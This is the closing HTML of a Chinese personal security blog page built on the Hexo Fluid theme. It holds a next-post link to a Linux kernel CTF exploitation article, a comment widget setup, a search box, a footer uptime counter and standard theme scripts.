                      <a href="/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/" title="【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF">
                        <span class="hidden-mobile">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- 网站运行时间的设置 -->
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
